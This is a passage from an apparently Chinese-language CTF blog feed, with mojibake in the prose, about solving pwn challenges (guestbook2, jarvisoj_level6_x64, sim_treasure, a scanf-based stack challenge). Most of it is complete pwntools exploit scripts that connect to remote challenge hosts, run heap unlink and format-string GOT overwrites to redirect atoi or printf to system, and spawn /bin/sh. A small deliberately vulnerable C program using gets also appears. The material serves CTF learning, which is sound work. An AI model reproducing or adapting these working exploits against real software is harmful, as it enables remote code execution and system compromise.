class="number">0x4010D4</span></span><br><span class="line">d_e=<span class="number">0x4010E0</span></span><br><span class="line">d_s=<span class="number">0x4010C8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length of new post: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter your post: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Post number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of post: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter your post: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Post number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))  </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;u&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;u&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">leak_libc=u64_recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c4b78</span></span><br><span class="line">sys_addr=libc_base+<span class="number">0x0000000000045390</span><span class="comment">#libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#debug(p,d_a,d_s,d_e,d_d)</span></span><br><span class="line">ptr=heap_addr-<span class="number">0x1910</span></span><br><span class="line">log_addr(<span class="string">&#x27;ptr&#x27;</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)    </span><br><span class="line">payload+=p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x120</span>,payload.ljust(<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(sys_addr))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220901221159452-2068743496.png"></p><h2 id="jarvisoj-level6-x64çš„exp"><a href="#jarvisoj-level6-x64çš„exp" class="headerlink" title="jarvisoj_level6_x64çš„exp"></a>jarvisoj_level6_x64çš„exp</h2><p>è¿™é“é¢˜å’Œguestbook2è¿™é“é¢˜ä¸€æ¨¡ä¸€æ ·(é™¤äº†äº¤äº’)</p><p>ç›´æ¥è´´ä¸‹expï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28822</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x4010EC</span></span><br><span class="line">d_a=<span class="number">0x4010D4</span></span><br><span class="line">d_e=<span class="number">0x4010E0</span></span><br><span class="line">d_s=<span class="number">0x4010C8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length of new note: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter your note: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of note: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Enter your note: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note number: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))  </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;t&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;s&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;tttttttt&#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#heap_addr=u64(p.recv(3).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#u64_recv_libc()</span></span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+<span class="number">0x0000000000045390</span><span class="comment">#+libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line">ptr=heap_addr-<span class="number">0x1910</span><span class="comment">#0x18f8</span></span><br><span class="line">log_addr(<span class="string">&#x27;ptr&#x27;</span>)</span><br><span class="line"><span class="comment">#delete(0)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x0</span>)+p64(<span class="number">0x81</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x120</span>,payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x120</span>,payload.ljust(<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line"><span class="comment">#debug(p,d_d,d_s,d_a,d_e,0x4008A6)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(sys_addr))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220901221215153-1898287042.png"></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iscc_pwn_éƒ¨åˆ†wp</title>
      <link href="/posts/fcb54cab.html"/>
      <url>/posts/fcb54cab.html</url>
      
        <content type="html"><![CDATA[<p>ç”±äºæœ¬äººæ¯”è¾ƒèœï¼ŒåŒæ—¶å­¦pwnçš„æ—¶é—´ä¸æ˜¯å¤ªä¹…ï¼Œå› æ­¤isccçš„å¾ˆå¤šå †è¿˜æ²¡æœ‰èƒ½åŠ›å»åšï¼ŒåªæŠŠæ¯”èµ›çš„æ ˆé¢˜ç»™åšå®Œäº† èµ›ååˆåšäº†ä¸€ä¸‹unlinké‚£é“é¢˜ã€‚å…¶ä»–å †é¢˜ç›®å‰è¿˜æ²¡æœ‰å¤ç°ã€‚ï¼ˆæœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²å¤ªç®€å•äº†ï¼Œæˆ‘å°±ä¸å†™wpäº†ï¼‰</p><h2 id="sim-treasure"><a href="#sim-treasure" class="headerlink" title="sim_treasure"></a>sim_treasure</h2><img src="https://s2.loli.net/2022/06/06/sDIeyH3LEjxJrvO.png" alt="image-20220502161408233" style="zoom: 33%;" /><h3 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h3><p>ç¨‹åºæ— é™æ¬¡æ‰§è¡Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæ€è·¯ä¸ºæ³„éœ²å‡ºå‡½æ•°çš„çœŸå®åœ°å€ï¼Œç„¶ååˆ©ç”¨libcåº“é‡Œçš„åç§»å¾—åˆ°libcåŸºåœ°å€ï¼Œç„¶ååŠ ä¸Šsystemå‡½æ•°åœ¨libcåº“ä¸­çš„åç§»ï¼Œç”¨printfæŠŠè‡ªå·±çš„gotè¡¨æ”¹æˆsystemå‡½æ•°ï¼Œç„¶åè¾“å…¥å‚æ•°&#x2F;bin&#x2F;shå³å¯è·å–shellã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;123.57.69.203&#x27;</span>,<span class="number">7010</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./b&#x27;)![](https://img2022.cnblogs.com/blog/2706180/202206/2706180-20220606104901019-1137756252.png)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/hacker/Desktop/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%2$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">payload=<span class="string">&#x27;%8$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_got_addr=e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=p32(printf_got_addr)+<span class="string">&#x27;%6$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr=u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc=printf_addr-<span class="number">0x512d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base---------&gt;&#x27;</span>,libc)</span><br><span class="line">hook=leak-<span class="number">0x88</span></span><br><span class="line">ret_addr=<span class="number">0x080483da</span></span><br><span class="line">ret_hook=ret_addr&amp;<span class="number">0xffff</span></span><br><span class="line">bin_sh=<span class="number">0x0017e1db</span>+libc</span><br><span class="line">system=<span class="number">0x0003d200</span>+libc</span><br><span class="line"></span><br><span class="line">low_offset=system&amp;<span class="number">0xffff</span></span><br><span class="line">high_offset=(system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hook-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;low---------------&gt;&#x27;</span>,<span class="built_in">hex</span>(low_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;high--------------&gt;&#x27;</span>,<span class="built_in">hex</span>(high_offset))</span><br><span class="line">payload=p32(printf_got_addr)+p32(printf_got_addr+<span class="number">2</span>)+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(low_offset-<span class="number">8</span>)+<span class="string">&#x27;c%6$hn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(high_offset-low_offset)+<span class="string">&#x27;c%7$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="è·³ä¸€è·³"><a href="#è·³ä¸€è·³" class="headerlink" title="è·³ä¸€è·³"></a>è·³ä¸€è·³</h2><h3 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3><p>1ã€scanfå‡½æ•°çš„å‚æ•°ä¸º%hhdæ—¶ï¼Œå¯ä»¥è¾“å…¥<code>-</code>åœ¨ä¸è¦†ç›–æ ˆä¸­æ•°æ®çš„æƒ…å†µä¸‹ï¼Œå æ®ä¸€ä¸ªå­—èŠ‚ï¼Œé…åˆ%så¯ä»¥æ³„éœ²æ ˆä¸­ä»»ä½•ä¸€ä¸ªå†…å®¹ã€‚</p><p>2ã€æ ¹æ®ä»¥å¾€çš„ç»éªŒæ„Ÿè§‰æ²¡æœ‰ä»€ä¹ˆæ ¸å¿ƒåˆ©ç”¨ç‚¹çš„æ—¶å€™ï¼Œå°½é‡æŠŠæ³¨æ„åŠ›éƒ½é›†ä¸­åˆ°æ–°é‡åˆ°çš„çŸ¥è¯†ä¸Šï¼Œè¿™é“é¢˜æˆ‘æœ‰æƒ³è¿‡æ‰¾ä¸€äº›å­—ç¬¦å»å®ç°åœ¨ä¸è¦†ç›–æ ˆä¸­æ•°æ®çš„æƒ…å†µä¸‹ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„å­—ç¬¦ï¼Œä»è€Œæ”¾å¼ƒäº†è¿™ä¸ªæ€è·¯ï¼Œç”šè‡³å°è¯•ç”¨çˆ†ç ´çš„æ–¹å¼æ¥åŠ«æŒæ‰§è¡Œæµï¼ˆä¸è¿‡æœ€åå¤±è´¥äº†ï¼‰ã€‚</p><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><img src="https://s2.loli.net/2022/06/06/X9vWBjzGlYh8aMD.png" alt="image-20220502150019723" style="zoom: 50%;" /><h3 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h3><img src="https://s2.loli.net/2022/06/06/NKZ3UjEhoayqJpv.png" alt="image-20220502100753717" style="zoom:50%;" /><p>è¿™é“é¢˜çš„å…³é”®ç‚¹å°±ä¸€ä¸ªï¼Œå½“scanfç”¨%hhdçš„æ—¶å€™ï¼Œ<code>-</code>è¿™ä¸ªä¸œè¥¿å¯ä»¥ä¸è¦†ç›–æ ˆä¸­æ•°æ®çš„æƒ…å†µä¸‹åœ¨æ ˆä¸­å ä¸€ä½ï¼Œè¯´çš„æœ‰ç‚¹æŠ½è±¡ï¼Œä»£ç å’Œæ•ˆæœå¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x58</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;17&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4a</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;18&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007200957664.png" alt="image-20221007200957664"></p><p>ç”±ä¸Šå›¾å¯ä»¥å‘ç°å­˜åœ¨-çš„åœ°æ–¹æ²¡æœ‰è¢«å¡«å…¥çš„åƒåœ¾æ•°æ®æ‰€è¦†ç›–ï¼ˆ0x7f4d1e038680ä¾ç„¶å­˜åœ¨ï¼‰</p><p>åŸç†å¦‚ä¸‹ï¼š</p><blockquote><p>scanfå‡½æ•°åœ¨æ ¼å¼åŒ–å­—ç¬¦ç±»å‹å’Œè¾“å…¥å­—ç¬¦ç±»å‹ä¸åŒ¹é…çš„æ—¶å€™ï¼Œä¸ä¼šæŠŠè¾“å…¥çš„å­—ç¬¦å†™åˆ°æ ˆä¸Šï¼Œä¹Ÿä¸ä¼šæŠ¥é”™ï¼Œè€Œæ˜¯ç»§ç»­è¿è¡Œ</p><p>scanf(â€œ%hhdâ€,a)</p><p>å½“è¾“å…¥çš„å­—ç¬¦ä¸ºæ•°å­—æ—¶ï¼Œæ‰å¯ä»¥è¢«å†™å…¥æ ˆä¸­ï¼Œå¦‚æœæ˜¯å­—æ¯åˆ™ä¼šè¢«å®šä¹‰ä¸ºéæ³•å­—ç¬¦ï¼Œåˆ™ä¼šåœç•™åœ¨ç¼“å†²åŒºå¯¼è‡´åé¢å³ä½¿å‡ºç°æ•°å­—ä¹Ÿä»…ä»…æ˜¯åœç•™åˆ°äº†ç¼“å†²åŒºï¼ˆå› ä¸ºaåœ¨ç¼“å†²åŒºè¿›ä¸å»ï¼Œåé¢çš„æ•°æ®ä¹Ÿéƒ½è¿›ä¸å»ï¼‰</p><p>é€šè¿‡é˜…è¯»scanfå‡½æ•°çš„æºç å‘ç°ï¼ˆ%dçš„æƒ…å†µï¼‰ï¼Œè¾“å…¥çš„æ•°æ®æ˜¯å…ˆåˆ°äº†ç¼“å†²åŒºä¸­ï¼Œç„¶åå¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœæ˜¯+æˆ–-æˆ–æ˜¯æ•°å­—åˆ™ä¼šæŠŠè¿™ä¸ªæ•°æ®ä»ç¼“å†²åŒºä¸­æ¥æ”¶ï¼Œå¦åˆ™ä¸æ¥æ”¶ï¼ˆä¾‹å¦‚å­—æ¯ï¼‰ã€‚ç»§ç»­é˜…è¯»scanfçš„æºç å‘ç°æ£€æµ‹åˆ°+å’Œ-æ—¶ï¼ŒæŒ‡é’ˆå‘åç§»åŠ¨äº†ä¸€ä½ï¼ˆå¹¶ä¸è¯»å–+æˆ–-åˆ°æ ˆä¸Šï¼‰ï¼Œå¹¶ä¸”æ­¤æ—¶ç¨‹åºä¼šè®¤ä¸ºè¿™ä¸ªç¬¦å·ä»…ä»…æ˜¯æ¥è¡¨ç¤ºæ­£è´Ÿçš„ï¼Œç„¶åå°†ç»§ç»­ä»ç¼“å†²åŒºä¸­è¯»å–æ•°æ®ï¼Œç›´åˆ°é‡åˆ°\nã€‚</p><p>è¿™æ ·å°±é€ æˆäº†æœ€å¼€å§‹è¯´çš„bugï¼Œ+å’Œ-é€šè¿‡äº†æ£€æŸ¥ä»ç¼“å†²åŒºé‡Œè¢«æå–äº†å‡ºæ¥ï¼Œä½†æ˜¯å®ƒè®©æŒ‡é’ˆå¾€åæŒªäº†ä¸€ä½ï¼Œå¹¶æ²¡æœ‰è¢«å†™å…¥åˆ°å†…å­˜é‡Œï¼Œä»è€Œè¾¾åˆ°äº†å ä½çš„ç›®çš„ã€‚</p></blockquote><p><img src="https://s2.loli.net/2022/06/06/V1Dv7kiP5Hrg6J2.png" alt="image-20220511141855121"></p><p>å¦‚æœæ˜¯æ­£å·æˆ–è€…è´Ÿå· åˆ™å¯ä»¥è§¦å‘char_buffer_add</p><p>ä¸‹é¢æ˜¯å¯¹ç¬¦å·æ£€æŸ¥éƒ¨åˆ†çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check for a sign.  */</span></span><br><span class="line">  negative = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (*s == L_(<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      negative = <span class="number">1</span>;</span><br><span class="line">      ++s;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (*s == L_(<span class="string">&#x27;+&#x27;</span>))</span><br><span class="line">    ++s;</span><br></pre></td></tr></table></figure><p>ï¼ˆæœ¬äººåªæ˜¯ä¸€ä½å¤§ä¸€çš„åˆå­¦è€…ï¼Œç¬¬ä¸€æ¬¡è¿›è¡Œscanfçš„æºç è°ƒè¯•ï¼ˆå…³äºæ­å»ºæºç è°ƒè¯•ç¯å¢ƒçš„æ–‡ç« åœ¨è¿™é‡Œ  <a href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">here</a>)ï¼Œå¦‚æœä¸Šè¿°æœ‰ç†è§£é”™è¯¯çš„åœ°æ–¹ï¼Œè¿˜è¯·å„ä½å¸ˆå‚…æ–§æ­£ï¼‰</p><p>è¿™ä¸ªåœ°æ–¹æ˜¯å¯ä»¥ç®€å•éªŒè¯ä¸€ä¸‹ï¼Œçœ‹çœ‹æ˜¯å¦è¾“å…¥å­—ç¬¦ä¼šæŠŠåé¢çš„æ•°å­—å¡åœ¨ç¼“å†²åŒºã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf [<span class="number">256</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%hhd&quot;</span>,buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">getchar();</span><br><span class="line">gets(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚æœåªè¾“å…¥æ•°å­—çš„è¯ï¼Œgetcharä¼šæŠŠå›è½¦ç»™è¯»å–ï¼Œç„¶åè§¦å‘getså°±å¯ä»¥å†è¾“å…¥ä¸€æ¬¡ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><img src="https://s2.loli.net/2022/06/06/rH6GL4RznAvxZ2p.png" alt="image-20220502203014478" style="zoom:50%;" /><p>å¦‚æœå…ˆè¾“å…¥æ•°å­—ï¼Œå†è¾“å…¥å­—ç¬¦ï¼Œå†è¾“å…¥æ•°å­—çš„è¯ï¼Œåˆ™ä¸ä¼šè§¦å‘gets(å› ä¸ºå­—ç¬¦å’ŒåŸæœ¬çš„å›è½¦éƒ½ç•™åœ¨äº†ç¼“å†²åŒºé‡Œï¼Œgetcharå¹¶æ²¡æœ‰è¯»å–è¿™ä¸ªå›è½¦ï¼Œå¯¼è‡´äº†getsæ‰§è¡Œçš„æ—¶å€™ç¢°åˆ°äº†å›è½¦ï¼Œgetsç›´æ¥å¤±æ•ˆ)ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p><img src="https://s2.loli.net/2022/06/06/EmzlMS8rC19cFRo.png" alt="image-20220502203303941" style="zoom:50%;" /><p>çŸ¥é“äº†è¿™ä¸ªåŸç†ï¼Œè¿™é“é¢˜åŸºæœ¬å°±ä¹±æ‰“äº†ã€‚å…ˆçœ‹ä¸€ä¸‹æ ˆé‡Œèƒ½åˆ©ç”¨çš„å†…å®¹</p><p><img src="https://s2.loli.net/2022/06/06/GZfTclSq91zwWVY.png" alt="image-20220502150925505"></p><p>å‘ç°é‡Œé¢æœ‰_startå‡½æ•°çš„åœ°å€ï¼Œé‚£ç”¨è¿™ä¸ªå¯ä»¥æ‹¿åˆ°ç¨‹åºåŸºåœ°å€ã€‚è¿˜æœ‰ä¸ª_setbufferå‡½æ•°çš„åœ°å€ï¼Œå¯ä»¥ç”¨å®ƒæ¥åŒ¹é…libcåº“ï¼Œç„¶åå†æ³„éœ²ä¸ªæ ˆåœ°å€ï¼Œç”¨äºä¹‹åçš„æ ˆè¿ç§»ï¼Œæœ€åå°±æ˜¯æŠŠcanaryç»™æ³„éœ²å‡ºæ¥ï¼Œç”¨äºæœ€åçš„åŠ«æŒæ‰§è¡Œæµ</p><h3 id="å¤§è‡´æ€è·¯ï¼š-1"><a href="#å¤§è‡´æ€è·¯ï¼š-1" class="headerlink" 